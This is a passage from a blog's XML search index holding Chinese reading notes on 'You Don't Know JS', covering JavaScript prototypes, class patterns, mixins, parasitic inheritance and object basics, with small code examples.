function()&#123; this.cool();// 内部委托！&#125;myObject.doCool(); // cool! 这里调用 doCool 是实际存在于 myObject 中的，这让我们的 API 设计更加清晰。从内部来说，我们实现的是遵循委托设计模式，通过[[Prototype]] 委托到 anotherObject.cool() 换句话说，内部委托比起直接委托可以让 API 接口设计更加清晰。 小结如果要访问的堆对象中不存在的一个属性，[[Get]] 操作就会查找对象内部[[Prototype]] 关联的对象，这个关联关系实际上定义了一条“原型链”（有点像嵌套作用域链），在查找属性时会对它进行遍历。 所有普通对象都有内置的 Object.prototype，指向原型链的顶端（比如说全局作用域），如果在原型链中查找不到指定的属性就会停止。toString()、valueOf 等函数和其他一些通用的功能都存在于 Object.prototype 对象上，因此语言中所有的对象都可以使用它们。 关联两个对象最常用的方法是使用 new 关键字进行函数调用，在调用的4个步骤会创建一个关联其他对象的新对象。 使用 new 调用函数会把新对象的 .prototype 属性到“其他对象”，带 new 的函数调用通常被称为 “构造函数嗲用”，尽管它们实际上和传统的面向类语言中的类构造函数不一样。 虽然这些 JavaScript 机制和传统面向类的语言中的“类初始化”和“类继承”很相似，但是 机制有一个核心区别，就是不会进行赋值，对象之间是通过内部的 [[Prototype]] 链进行关联的。 相比之下，“委托”是一个更合适的术语，因为对象之间的关系不是复制而是委托。]]></content>
      <categories>
        <category>JavaScript</category>
      </categories>
      <tags>
        <tag>你不知道的JavaScript</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[你不知道的JavaScript(上)——混合对象“类”]]></title>
    <url>%2F2019-01-21-%E4%BD%A0%E4%B8%8D%E7%9F%A5%E9%81%93%E7%9A%84JavaScript(%E4%B8%8A)%E2%80%94%E2%80%94%E6%B7%B7%E5%90%88%E5%AF%B9%E8%B1%A1%E2%80%9C%E7%B1%BB%E2%80%9D.html</url>
    <content type="text"><![CDATA[这个系列的作品是上一次当当网有活动买的，记得是上一年九月份开学季的时候了。后面一直有其他的事情，或者自身一些因素，迟迟没有开封这本书。今天立下一个 flag，希望可以在两个月内看完并记录这个系列的三本书，保持学习的激情，不断弥补自己的基础不够扎实的缺点。 作者的github 书籍的购买链接，自己搜。 你不知道的JavaScript(上)——混合对象“类”上一章讲了对象，下面介绍和类相关的对象编程，在研究类的具体机制之前，先介绍面向类的设计模式：实例化（instantitation）、继承（inheritance）和（相对）多态（polymorphism） 可以看到，这些概念实际上无法直接对应到 JavaScript 的对象机制，因为会介绍许多 JavaScript 开发者所使用的解决方法（比如混入，mixin） 类理论类/继承描述了一种代码的组织结构形式——一种在软件中对真实世界中问题领域的建模方法。 面向对象编程强调的是数据和操作数据的行为本质上是互相关联的（当然，不同的数据有不同的行为），因为好的设计就是把数据以及和它相关的行为打包（或者说封装起来）。这在正式的计算机科学中有时被称为数据结构。 举例来说，用来表示一个单词或者是短语的一串字符通常被称为 字符串，字符就是数据，但是你关心的往往不是数据是什么，而是可以对数据做什么，所以可以应用在这种数据上的行为（计算长度、添加数据、搜索等等）都被设计成了 String 类的方法。 所有字符串都是 String 类的一个实例，也就是说它是一个包裹，包含字符数据和我们可以应用在数据上的函数。 我们还可以使用类对数据结构进行分类，可以把任意数据结构看做范围更广的定义的一种特例。“汽车”可以被当做是 “交通工具”的一种特例，后者是更广泛的类。我们可以在软件中定义一个 Vehicle 类 和 一个 Car 类来对这种关系进行建模。 Vehicle 的定义可能包含由推进器（比如引擎）、载人能力等等，这些都是 Vehicle 的行为，我们在 Vehicle 中定义的是（几乎）所有类型的交通工具（飞机、火车和汽车）都包含的东西。 在软件中，对不同交通工具重复定义 “载人功能”是没有意义的，相反，我们只要在 Vehicle 中定义一次。定义 Car 时，只要声明它继承（没有扩展）了 Vehicle 这个基本定义就可以了，Car 的定义就是对通用 Vehicle 定义的特殊化。 虽然 Vehicle 和 Car 会定义相同的方法，但是实例中的数据可能是不同的，比如每辆汽车独一无二的 VIN（汽车识别码）等等。 这就是类、继承和实例化。 类的另一个概念是多态，这概念是说父类的通用行为可以被子类用更特殊的行为重写。实际上，相对多态性运行我们从重写行为中引用基础行为。 类理论强烈建议父类和子类使用相同的方法名来表示特定的行为，从而让子类重写父类，我们之后会看到，在 JavaScript 代码中这样做会降低代码的可读性和健壮性。 “类” 的设计模式如果之前没有把类当做设计模式来看待，我们可能讨论比较多是面向对象设计模式。从这个角度来看，我们就是在（低级）面向对象类的基础上实现了所有（高级）的设计模式，似乎面向对象就是优秀代码的基础。 过程化编程，这种代码只包含过程（函数）调用，没有高层的抽象。 JavaScript 中的“类”JavaScript 在很长的一段时间内，只有一些近似类的语法元素（new 和 instanceof），不过后面 ES6 中增加了一个元素，比如 class 关键字 这个是不是意味着 JavaScript 中实际上有类呢？简单来说：不是。 由于类是一种设计模式，所以你可以用一些方法近似实现类的功能。为了满足对于类设计模式的最普遍需求，JavaScript 提供了一些近似类的语法。虽然有近似类的语法，但是 JavaScript 的机制似乎一直在阻止你使用类设计模式。在近似类的表象之下，JavaScript 的机制其实和类完全不同。语法糖和（广泛使用的）JavaScript “类”库试图掩盖这个现实，但是你迟早会面对它：其他语法中的类和 JavaScript 中的 “类”并不一样。 总结一下，在软件设计中类是一种可选的模式，需要决定是否在 JavaScript 中使用它。 类的机制在许多面向类的语言中，“标准库”会提供 Stack 类，它是一种 “栈”数据结构（支持压入、弹出等等）。Stack 类内部会有一些变量来存储数据，同时提供一些共有的可访问行为（“方法”），从而让你的代码可以和（隐藏的）数据进行交互（比如添加、删除数据）。 但是在这些语言中，实际上并不是直接操作 Stack （除非创建一个静态类成员引用）。Stack 类仅仅是一个抽象的表示，它描述了所有“栈”需要做的事，但是它本身并不是一个“栈”，你必须先实例化 Stack 类然后才能对它进行操作。 建造“类”和“实例”的概念来源于房屋建造。 建筑师会规划出一个建筑的所有特性,宽高材料等等，但是它不在意建筑会被建造在哪里，也不关心数量。也不关心建筑内的内容，只关心用什么结构来容纳它们。 建筑工人会按照建造蓝图复制到现实世界中的建筑中。建筑和蓝图之间的关系是间接的，一个类就是一张蓝图，为了获得真正可以交互的对象，我们必须按照类来建造（实例化）一个东西，这个东西通常被称为实例，有需要的话，我们可以直接在实力上调用方法并访问其所有共有的数据属性。这个对象就是类中描述的所有特性的一份副本。 构造函数类实例是由一个特殊的类方法构造的，这个方法名通常和类名相同，被称为构造函数，这个方法的任务就是初始化实例需要的所有消息（状态）。 举个例子，思考关于类的伪代码： 12345678910class CoolGuy&#123; spcialTrick = nothing CoolGuy(trick)&#123; spcialTrick = trick &#125; showOff()&#123; output(&apos;Here is my trick:&apos;,spcialTrick); &#125;&#125; 我们可以调用类构造函数来生成一个 CoolGuy 实例： 12Joe = new CoolGuy('jumping rope');Joe.showOff(); // Here is my trick:jumping rope 注意：GoolGuy 类中有一个 CoolGuy 构造函数，执行 new CoolGuy() 时实际上调用的就是它。构造函数会返回一个对象（也就是类的一个实例），之后我们在这个对象上调用 showOff() 方法，来输出指定 CoolGuy 的特长。 类构造函数属于类，而且通常和类同名，此外，构造函数大多数需要用 new 来调用，这样语言引擎才知道你想要构造一个新的类实例。 类的继承在面向类的语言中，可以先定义一个类，然后定义一个继承前者的类。 后者通常被称为“子类”，前者通常被称为“父类”。这些术语=显然是类比父母和孩子，不过在意思上稍有扩展。 同理，定义好一个子类之后，相对于父类来说它就是一个独立并且完全不同的类，子类会包含父类行为的原始副本，但是也可以重写所有继承的行为甚至定义新行为。 非常重要的一点是，我们讨论的父类和子类并不是实例，父类和子类的比喻容易造成一些误解，实际上我们应当把父类和子类称为父类 DNA 和 子类 DNA ，我们根据这些 DNA 来创建一个人，然后才能和他进行沟通。 Vehicle 和 Car 类，思考下面关于类继承的伪代码： 123456789101112131415161718192021222324252627class Vehicle &#123; engines = 1 ignition()&#123; output(&quot;Turning on my engine.&quot;) &#125; drive()&#123; ignition(); output(&quot;Steering and moving forward!&quot;) &#125;&#125;class Car inherits Vehicle &#123; wheels = 4 drive()&#123; inherited:drive() output(&quot;Rolling on all&quot;,wheels,&quot;wheels&quot;) &#125;&#125;class SpeedBoat inherits Vehicle &#123; engines = 2 ignition()&#123; output(&quot;Turning on my&quot;,engines, &quot;engine.&quot;) &#125; pilot()&#123; inherited:drive() output(&quot;Speeding through the water with ease!&quot;) &#125;&#125; 通过定义 Vehicle 类来假设一种发动机、一种点火方式、一种驾驶方法，但是不可以制造一个通用的“交通功能”，因为类只是一个抽象的概念。 定义了两类具体的交通工具，Car 和 SpeedBoat，它们都从 Vehicle 继承了通用的特性并根据自身类别修改了某些特性，汽车需要四个轮子，快艇需要两个发动机。因此，它必须启动两个发送机的点火装置。 多态Car 重写了继承自父类的 drive() 方法，但是之后 Car 调用 inherited:drive() 方法，这表明了Car 可以继承来自父类的原始 drive()方法。快艇的 pilot() 方法同样引用了原始的 drive() 方法。 这个技术被称为多态或者虚拟多态，在上面的例子中，更恰当的说法是相对多态。 多态是一个非常广泛的话题，我们现在所说的“相对”多态只是一个方面：任何方法都可以引用继承层次中高层的方法（无论高层方法名和当前方法名是否相同）。之所以说“相对”是因为我们并不会定义想要访问的绝对继承层次（类），而是使用相对引用“查找上一层”。 在许多语言中可以使用 super 代替上面例子中的 inherited 它的含义是“超类”（superclass），表示当前的类的父类/祖先类。 多态的另一个方面是，在继承链的不同层次中一个方法名可以被多次定义，当调用方法时会自动选择合适的定义。在之前的代码中就有这样的两个例子：drive 被定义在 Vehicle 和 Car 中，ignition 被定义在 Vehicle 和 SpeedBoat 中。 在传统的面向类的语言中的 super 还有一个功能，就是从子类的构造函数中通过 super 可以直接调用父类的构造函数。通常来说这没有什么问题。因为对于真正的类来说，构造函数是属于类的，然后在 JavaScript 中恰好相反——实际上“类”是属于构造函数的（类似 Foo.prototype..这样的类型引用）。由于 JavaScript 中父类和子类的关系只存在于两者构造函数对应的 .prototype 对象中，因此它们的构造函数之间并不存在直接联系，从而无法简单地实现两者的相对引用（在 ES6 中可以通过 super 来”解决“这个问题）。 我们可以在 ignition() 中看到多态有趣的一点，在 pilot() 中通过相对多态引用了（继承）Vehicle中的 drive 方法直接通过名字（而不是相对引用）引用了 ignotion() 方法。 那么语言引擎会使用哪个 ignition(),Vehicle 的还是 SpeedBoat 的？实际上它会使用 SpeedBoat 中的。如果你直接实例化 Vehicle 类然后调用 它的 drive 那么语言引擎就会使用 Vehicle 中的 ignition 方法。 换言之，ignition 方法定义的多态性取决于你是在哪个类的实例中引用它。只有理解了这个细节才能理解 JavaScript 中类似（但是并不相同）的 [[Prototype]]机制。 在子类（而不是它们创建的实例对象）中也可以相对引用它继承的父类，这种相对引用通常被称为 super。 多态不表示子类和父类有关联，子类得到的只是父类的一份副本，类的继承其实就是复制。 多重继承有些面向类 的语言允许继承多个类，多重继承意味着所有父类的定义都会被复制到子类中。从表面上看，对于类来说似乎是一个非常有用的功能，可以把许多功能组合在一起。然而，这个机制同时也会带来很多复杂的问题。如果两个父类中都定义了 drive 方法的话，子类引用的是哪个？这样多态继承的很多优点就不存在了。 除此之外，还有一种被称为钻石问题的变种。这问题中，子类 D 继承自两个父类（B 和 C） ，这两个父类都继承 A。如果 A 中 有 drive 方法并且 B 和 C 都重写了这个方法（多态），那当 D 引用应该选择哪个版本？ 相比之下，JavaScript 要简单得多，它本身并不提供 “多重继承”功能，然后开发者会用其他办法来实现多重继承。 混入在继承或者实例化时，JavaScript 的对象机制并不会自动执行复制行为，简单来说，JavaScript 中只有对象，并不存在可以被实例化的 “类”，一个对象并不会被复制到其他对象，它们会被关联起来。由于在其他语言中类表现出来的都是复制行为，因此 JavaScript 开发者也想出了一个方法来模拟类的复制行为，这个方法就是混入：显式混入和隐式混入 显式混入首先我们回顾一下之前提到的 Vehicle 和 Car ，由于 JavaScript 不会自动实现 Vehicle 到 Car 的复制行为，所以我们需要手动实现复制功能。这个功能在许多库和框架汇总被称为 extend(…) ,但是为了方便理解我们称之为 mixin(…) 1234567891011121314151617181920212223242526272829// 非常简单的 mixin 例子function mixin(sourceObj,targetObj)&#123; for(var key in sourceObj)&#123; // 只会在不存在的情况下复制 if(!(key in targetObj))&#123; targetObj[key] = sourceObj[key]; &#125; &#125; return targetObj;&#125;var Vehicle = &#123; engines:1, ignition:function()&#123; console.log("Turing on my engine"); &#125;, drive:function()&#123; this.ignition(); console.log("Streeing and moving forward!"); &#125;&#125;var Car = mixin(Vehicle,&#123; wheels:4, drive:function()&#123; Vehicle.drive.call(this); console.log("Rolling on all" +this.wheels + "wheels!"); &#125;&#125;); 有一点需要注意的是，我们处理的已经不是类，因为在 JavaScript 中不存在类，Vehicle 和 Car 都是对象，供我们分别复制和粘贴 现在 Car 中就有了一份 Vehicle 属性和函数的副本，从技术角度来说，函数实际没有被复制，复制的只是函数引用。所以，Car 中的属性 ignition 只是从 Vehicle 中复制过来的对于 ignition() 函数的引用。相反，属性 engines 就是直接从 Vehicle 中复制了值1. Car 已经有了 drive 属性（函数），所以这个属性引用并没有直接被 mixin 重写，从而保留了 Car 中定义的同名属性，实现了“子类”对 “父类”的属性的重写 1.再说多态Vehicle.drive.call(this); 这就是显式多态，记得伪代码中对应的语句是 inherited：drive()，我们称之为相对多态。 JavaScript 并没有相对多态的机制。所以，由于 Car 和 Vehicle 中都有 drive() 函数，为了指明调用对象，我们必须使用绝对（而不是相对）引用。我们通过名称显式指定 Vehicle 对象并调用它的 drive 函数。 但是如果直接执行 Vehicle.drive()，函数调用中的 this 会被绑定到 Vehicle 对象而不是 Car 对象，这并不是我们想要的。因此，我们会使用 .call(this) 来确保 drive() 在 Car 对象的上下文中执行。 如果函数 Car.drive 的名称标识符并没有和 Vehicle.drive 重叠（或者说“屏蔽”）的话，我们就不用实现方法多态，因为调用 mixin(..) 有时会把函数 Vehicle.drive() 的引用复制到 Car 中，因此我们可以直接访问 this.drive().正是由于存在标识符重叠，所以必须使用更加复杂的显式多态方法。 在支持相对多态的面向类的语言中，Car 和 Vehicle 之间的联系只在类的定义的开头被创建，从而只需要在这一个地方维护两个类的联系。 但是在 JavaScript 中（由于屏蔽）使用显式伪多态会在所有需要使用（伪）多态引用的地方创建一个函数关联，这会极大地增加维护成本。此外，由于显式伪多态可以模拟多重继承，所以它会进一步增加代码的复杂度和维护程度。 使用伪多态通常会导致代码变得复杂，难以阅读并且难以维护，因此应当尽量避免使用显式伪多态，因为这样往往会得不偿失。 2.混合复制回归之前的 mixin 函数 12345678910// 非常简单的 mixin 例子function mixin(sourceObj,targetObj)&#123; for(var key in sourceObj)&#123; // 只会在不存在的情况下复制 if(!(key in targetObj))&#123; targetObj[key] = sourceObj[key]; &#125; &#125; return targetObj;&#125; 分析一下 mixin 的工作原理，它会遍历 sourceObj 的属性，然后在 targetObj 没有这个属性就会进行复制。由于我们是在目标对象初始化之后才进行复制，因此一定要小心不要覆盖目标对象的原有属性。 如果我们是先进行复制然后对 Car 进行特殊化的话，就可以跳过存在性检查。不过这种方法并不好用并且效率更低，不如第一种方法常用： 123456789101112131415161718192021// 另外一种混入函数，可能有重写风险function mixin(sourceObj,targetObj)&#123; for(var key in sourceObj)&#123; targetObj[key] = sourceObj[key]; &#125; return targetObj;&#125;var Vehicle = &#123; // ...&#125;// 首先创建一个空对象把 Vehicle 的内容复制进去var Car = mixin(Vehicle,&#123;&#125;);// 然后把新内容复制到 Car 中mixin(&#123; wheel:4, drive:function()&#123; // .. &#125;&#125;,Car) 这两种方法都可以把不重叠的内容从 Vehicle 中显式复制到 Car 中。“混入”这个名字来源于这个过程的一种解释：Car 中混合了 Vehicle 的内容，就像你把巧克力混合到你最喜欢的饼干面团中一样。 复制操作完成后，Car 和 Vehicle 分离了，向 Car 中添加属性不会影响 Vehicle ，反之亦然。 这里跳过了一些小细节，实际上，在复制完成之后两者之间仍然有一些巧妙的方法可以影响到对方，例如引用同一个对象（比如一个数组） 由于两个对象引用的是同一个函数，因此这种复制（或者说混入）实际上并不能完全模拟面向类的语言中的复制。 JavaScript 中的函数无法（用标准、可靠的方法）真正地复制，你只是复制对共享函数对象的引用（函数就是对象）。如果你修改了贡献的函数对象（比如 ignition），比如添加了一个属性，那 Vehicle 和 Car 都会受到影响。 显式混入是 JavaScript 中一个很棒的机制，不过它的功能也没有看起来那么强大。虽然它可以把一个对象的属性复制到另一个对象中，但是这其实并不能带来太多好处，无非就是少几条定义语句，而且还会带来我们刚刚提及的函数对象引用问题。 如果你向目标对象中显式混入超过一个对象，就可以部分模仿多重继承行为，但是仍没有直接的方式来处理函数和属性的同名问题。有些开发者/库提出了“晚绑定”技术和其他的一些解决方法，但是从根本上来说，使用这些方法通常会（降低性能并且）得不偿失。 一定要注意，只在能够提高代码可读性的前提下使用显式混入，避免使用增加代码理解难度让对象关系更加复杂的模式。 如果使用混入时感觉越来越困难，那或许你应该停止使用它了。实际上，如果你必须使用一个复杂的库或者函数来实现这些细节，那就标志着你的方法是有问题的或者是不必要的。后面会试着提出一个更简单的方法，它能满足这些需求并且可以避免所有的问题。 3.寄生继承显式混入的一种变体被称为“寄生继承”，它既是显式的又是隐式的，下面是它的工作原理： 123456789101112131415161718192021222324252627// 传统的 JavaScript 类 Vehiclefunction Vehicle()&#123; this.engines = 1;&#125;Vehicle.prototype.ignition = function()&#123; console.log("Turing on my engine");&#125;Vehicle.prototype.drive = function()&#123; this.ignition(); console.log("Streeing and moving forward!");&#125;// 寄生类 Carfunction Car()&#123; var car = new Vehicle(); car.wheels = 4; var vehDrive = car.drive; car.drive = function()&#123; vehDrive.call(this); console.log("Rolling on all" +this.wheels + "wheels!"); &#125; return car;&#125;var myCar = new Car();myCar.drive();//Turing on my engine// Streeing and moving forward!// Rolling on all 4 "wheels! 上面的代码首先复制了一份 Vehicle （对象）父类的定义，然后混入子类（对象）的定义（如果需要的话保留到父类的特殊引用），然后用这个复合对象构建实例。 调用 new Car() 时会复制一个新的对象并绑定到 Car 的 this 上，但是因为我们没有使用这个对象而是返回了我们自己的 car 对象，所以最初被创建的这个对象会被丢弃，因为可以不使用 new 关键字调用 Car().这样做的结果是一样的，但是可以避免创建并丢弃多余的对象。 隐式混入隐式混入和之前提到的显式伪多态很像，因此也具备同样的问题。 思考下面的代码： 123456789101112131415161718var Something = &#123; cool:function()&#123; this.greeting = "Hello World"; this.count = this.count ? this.count + 1 : 1; &#125;&#125;Something.cool();Something.greeting; // Hello WorldSomething.count; // 1var Another = &#123; cool:function()&#123; // 隐式 把 Something 混入 Another Something.cool.call(this); &#125;&#125;Another.cool();Another.greeting; // Hello WorldAnother.count; // 1 (count 不是共享状态) 通过在构造函数调用或者方法调用中使用 Something.cool.call(this)，我们实际上“借用”了函数Something.cool() 并在 Another 的上下文汇总调用了它（通过 this 绑定），最终的结果是 Something.cool() 中的赋值操作都会应用在 Another 对象上而不是 Something 对象上。 因为，我们 把 Something 的行为 “混入”到了 Another 中。 虽然这类技术利用了 this 的重新绑定功能，但是 Something.cool.call(this) 仍然无法变成相对（而且更灵活）引用，所以在使用时要非常小心，通常来说，尽量避免使用这样的结构，比保证代码的整洁和可维护性。 小结类是一种设计模式，许多语言都提供了对于面向类设计软件的原生语法，JavaScript 也有类似的语法，但是和其他语言中的类完全不同。类意味着复制。 传统的类被实例化，它的行为是会被复制到实例中，类被继承时，行为也会被复制到子类中。 多态（在继承链的不同层次名称相同但是功能不同的函数）看起来似乎是从子类引用父类，但是本质上引用的其实是复制的结果。 JavaScript 并不会（像类那样）自动创建对象的副本。 混入模式（无论是显式还是隐式）可以用来模拟类的复制行为，但是通常会产生丑陋并且脆弱的语法，不如显式伪多态（OtherObj.methodName.call(this,…)），这会让代码更加困难并且难以维护。此外，显式混入实际上无法完全模拟类的复制行为，因为对象（函数）只能复制引用，无法复制被引用的对象或者是函数本身。忽视这一点会导致许多问题。 总结来说，在 JavaScript 中模拟类是得不偿失的，虽然能解决当前的问题，但是可能会埋下更多的隐患。]]></content>
      <categories>
        <category>JavaScript</category>
      </categories>
      <tags>
        <tag>你不知道的JavaScript</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[你不知道的JavaScript(上)——对象]]></title>
    <url>%2F2019-01-19-%E4%BD%A0%E4%B8%8D%E7%9F%A5%E9%81%93%E7%9A%84JavaScript(%E4%B8%8A)%E2%80%94%E2%80%94%E5%AF%B9%E8%B1%A1.html</url>
    <content type="text"><![CDATA[这个系列的作品是上一次当当网有活动买的，记得是上一年九月份开学季的时候了。后面一直有其他的事情，或者自身一些因素，迟迟没有开封这本书。今天立下一个 flag，希望可以在两个月内看完并记录这个系列的三本书，保持学习的激情，不断弥补自己的基础不够扎实的缺点。 作者的github 书籍的购买链接，自己搜。 你不知道的JavaScript(上)——对象上一章讲了函数调用位置的不同会造成 this 绑定对象的不同，那么对象是什么呢？为什么我们要绑定它？ 语法对象可以通过两种形式定义：声明（文字）形式和构造形式。 对象的文字语法大概是这样： 1234var myObj = &#123; key:value // ...&#125; 构造形式大概是这样的： 12var myObj = new Object();myObj.key = value; 构造形式和文字形式生成的对象是一样的。唯一的区别是，在文字声明中你可以添加多个键/值对，但是在构造形式中你必须逐个添加属性。 用构造形式创建出来的对象是非常少的，一般来说会使用文字语法，绝大多数内置也是这样做的。 类型对象是 JavaScript 的基础，在 JavaScript 中一共有六种主要类型（术语是“语言类型”） string number boolean null undefined object 注意，简单基本类型（string,boolean,number,null 和 undefined）本身并不是对象。null 有时被当做一种对象类型，但是这其实只是语言本身的一个 bug,即对 null 执行 typeof null 时会返回字符串 “object”(原理是这样的，不同的对象在底层都表示为二进制，在 JavaScript 中二进制前三位都是0的话会被判断为 object 类型，null 的二进制表示全是0，自然前三位也是0，所以执行 typeof 是会返回 “object”)。实际上，null 本身是基本类型。 有一种常见的错误说是“JavaScript 中万物是对象”，这显然是错误的。 实际上，JavaScript 中有许多特殊的对象子类型，我们可以称之为复杂基本类型。 函数就是对象的一个子类型（从技术角度来说就是“可调用的对象”）。JavaScript 中的函数是“一等公民”，因为它们本质上和普通函数的对象是一样（只是可以调用）。所以可以像操作其他对象一样操作函数（比如当做另一个函数的参数）。 数组也是对象的一种类型，具备一些额外的行为。数组中内容的组织方式比一般的对象要稍微复杂一些。 内置对象JavaScript 中还有一些对象子类型，通常被称为内置对象，有些内置对象的名字看起来和简单基础类型一样，不过它们的关系更复杂. Stting Number Boolean Object Function Array Date RegExp Error 这些内置对象从表现形式来说很像其他语言中的类型（type）或者类（class）,比如 Java 中的 String 类。 但是在 JavaScript 中，它们实际只是一些内置函数，这些内置函数可以当做构造函数（由 new 产生的函数）来使用，从而可以构造一个对应子类的新对象。举例来说： 12345678910var strPrimitive = "I am a string";typeof strPrimitive; // stringstrPrimitive instanceof String; // falsevar strObject = new String("I am a string");typeof strObject; // objectstrObject instanceof String; // true// 检查 sub-type 对象Object.prototype.toString.call(strObject); //[Object String] Object.prototype.toString 简单来说，可以认为子类型在内部借用了 Object 中的 toString 方法，从代码中可以看到，strObject 是由 String 构造函数创建的一个对象。 原始值 “I am a string” 并不是一个对象，它只是一个字面量，并且是一个不可变的值，如果要在这个字面量上执行一些操作，比如获取长度，访问其中的某个字符等，那需要将其转换为 String 对象。 幸好，在必要时语言自动把字符字面量转换成了一个 String 对象，也就是说你并不需要显示创建一个对象，JavaScript 社区汇中的大多数人都认为能够使用文字形式时就不要使用构造形式 思考下面的代码： 123var strPrimitive = "I am a string";console.log(strPrimitive.length); // 13console.log(strPrimitive.charAt(3)); // 'm' 使用以上两种方法，我们可以直接在字面量上面访问属性或者方法，之所以可以这样做，是因为引擎自动把字面量转换成了 String 对象，所以可以访问属性或者方法。同样的事情也会发生在数值字面量上，如果使用类似 42.457.toFiexd(2)的方法，引擎会把 42 转换成 new Number(42)，对于布尔字面量来说也是如此。 null 和 undefined 没有对应的构造形式，它们只有文字形式。相反，Date 只有构造，没有文字形式。 对于 Object、Array、Function 和 RegExp 来说，无论是使用文字形式还是使用构造形式，它们都是对象，不是字面量。在某些情况下，相比用文字形式创建对象，构造形式可以提供额外的一些选项。由于这两种形式都可以创建对象，所以我们首要选的是更简单文字形式。建议只在需要额外选项的时候使用构造形式。 Error 对象很少在代码中显示创建，一般是在抛出异常的时候被自动创建的，也可以使用 new Error(..) 这种构造形式来创建，不过一般来说是用不到的。 内容之前我们提到过的，对象的内容是由一些存储在特定命名位置的（任意类型的）值组成的，我们称之为属性。 需要强调一点是，当我们说“内容”时，似乎在暗示这些值实际上被存储在对象内部，但是这只是它的表现形式，在引擎内部，这些值的存储方式是多种多样的，一般并不会存在对象容器内部。存储在对象容器内部的是这些属性的名称，它们就像指针（引用）一样，指向这些值的真正的存储位置。 思考下面的代码： 12345var myObject = &#123; a:2&#125;myObject.a // 2myObject["a"] // 2 如果要访问 myObject 中 a 的位置上的值，我们需要使用.操作符或者[] 操作符。.a 语法通常被称为“属性访问”。[“a”]语法通常被称为 “键访问”。实际上它们访问的是同一个位置，并且会返回相同的值2，所以这两个术语是可以互换的。 这两种语法的去呗主要是，操作符要求属性名满足标识符的命名规范，而[“..”]语法可以接受任意 UTF-8/Unicode 字符串作为属性名。举例来说，如果要引用名称为 “Super-Fun!”的属性，就必须使用 [“Super-func!””]语法来访问，因为 Super-Fun! 并不是一个有效的标识符属性名。 此外，由于 [“..”]语法使用字符串来访问属性，所以可以在程序中构造这个字符串。比如说： 123456789var myObject = &#123; a:2&#125;var idx;if(wantA)&#123; idx = "a"&#125;// 之后console.log(myObject[idx]); // 2 在对象中，属性名永远字符串，如果你是用 string (字面量)以外的其他值作为属性名，那它首先会转换为一个字符串。即使是数字也不例外，虽然在数组下标中使用的是数字，但是在对象属性名中数字会被转换成字符串，所以当心不要搞混对象和数组中数字的用法： 12345678var myObject = &#123;&#125;;myObject[true] = "foo";myObject[3] = "bar";myObject[myObject] = "baz"myObject["true"]; // foomyObject["3"]; // barmyObject["object object"]; // baz 可计算属性名如果需要通过表达式来计算属性名，那么刚刚讲到的 myObject[..]这种属性访问语法就有用了，如可以使用 myObject[prefix + name]。但是使用文字形式来访问对象时这样做是不行的。 ES6 增加了可计算属性名，可以在文字形式中 使用 []包裹一个表达式来作为属性名： 1234567var prefix = "foo";var myObject = &#123; [prefix + "bar"]："hello", [prefix + "baz"]："world",&#125;myObject["foobar"]; // hellomyObject["foobaz"]; // world 可计算属性名最常用的场景是 ES6 的符号（Symbol），简单来说，它们是一种新的基础数据类型，包含一个不透明并且无法预测的值（从技术角度来说就是一个字符串）。一般来说你不会用到的符号的实际值（因为理论上来说在不同的 JavaScript 引擎中值是不同的），所以通常你接触的是符号的名称，比如 Symbol.Something 123var myObject = &#123; [Symbol.Something]:"hello world"&#125; 属性与方法如果访问的对象属性是一个函数，有些开发者喜欢使用不一样的叫做以作区分，由于函数很容易被认为是属于某个对象，在其他语言中，属于对象（也被称为 “类”）的函数通常被称为“方法”，因此把“属性访问”说成“方法访问”也就不奇怪了。 JavaScript 的语法规范也作出了同样的区分。从技术角度来说，函数永远不会“属于”一个对象，所以把对象内部引用的函数称为“方法”似乎有点不妥。确实，有些函数具有 this 引用，有时候这些 this 确实会指向调用位置的对象引用，但是这种用法从本质上说并没有把这个函数变成一个“方法”，因为 this 是在运行时根据调用位置动态绑定的，所以函数和对象的关系最多也只能说是间接关系。 无论返回值是什么类型，每次访问对象的属性就是属性访问，如果属性访问放回的是一个函数，那它也并不是一个“方法”。属性访问返回的函数和其他函数没有任何区别（处理可能发生的隐式绑定 this）、 举个例子： 12345678910function foo()&#123; console.log("foo");&#125;var someFoo = foo; // 对 foo 变量引用var myObject = &#123; someFoo:foo&#125;foo(); // function foo()&#123;...&#125;someFoo(); // function foo()&#123;...&#125;myObject.someFoo; // function foo()&#123;...&#125; someFoo 和 myObject.someFoo 只是对于同一个函数的不同引用，并不能说明这个函数是特别的或者“属于”某个对象。如果 foo()定义时在内部有一个 this 引用，那这两个函数引用的唯一区别就是 myObject.someFoo 中的 this 会被隐式绑定到一个对象。无论哪种引用形式否不能称之为”方法” 最保险的说法是，“函数”和“方法”在 JavaScript 中是可以互换的。 ES6 中增加了 super 引用，一般来说会被用在 class 中。super 的行为似乎更有理由把 super 绑定的函数称为 “方法”，但是，这些只是一些语义（和技术）上的微妙差别，本质上是一样的 即使在对象的文字形式声明了一个函数表达式，这个函数也不会”属于”这个对象——它们只是对相同函数对象的多个引用 12345678var myObject = &#123; foo:function()&#123; console.log("foo"); &#125;&#125;var someFoo = myObject.foo;someFoo; // function foo()&#123;...&#125;myObject.foo; //function foo()&#123;...&#125; 数组数组也支持[]访问形式，数组有一套更加结构化的值存储机制（不过仍然不限制值的类型）。数组期望的是数值下标，也就是说值存储位置（通常被称为索引）是非负整数，比如说 0 和 42 1234var myArray = ["foo",42,"bar"];myArray.length; //3myArray[0]; // "foo"myArray[2]; // "bar" 数组也是对象，所以虽然每个小标都是整数，你仍然可以给数组添加属性： 1234var myArray = ["foo",42,"bar"];myArray.baz = "baz";myArray.length; // 3myArray.baz; // "baz" 可以看到虽然添加了命名属性（无论是通过.语法还是[]语法），数组的 length 值并未发生变化。完全可以把数组当做一个普通的键/值对象来使用，并且不添加任何数值索引，但是这并不是一个好主意。数组和普通的对象都根据其对应的行为和用途进行了优化，所以最好只用对象来存储/值对，只用数组来存储数值下标/值对。 注意：如果你试图向数组添加一个属性，但是属性名“看起来”像一个数字，那它会变成一个数值下标（因为你会修改数组的内部而不是添加一个属性），例如 1234var myArray = ["foo",42,"bar"];myArray["3"] = "baz";myArray.length; // 4myArray[3]; // "baz" 复制对象JavaScript 初学者最常见的问题之一就是如何复制一个对象，看起来应该有一个内置的 copy() 方法，实际上事情比你想象的更复杂，因为我们无法选择一个默认的复制算法。 举例子： 123456789101112function anotherFunction()&#123;/*..*/&#125;var anotherObject = &#123; c:true&#125;var anotherArray = [];var myObject = &#123; a:2, b:anotherObject, // 引用，不是复本 c:anotherArray, // 另一个引用 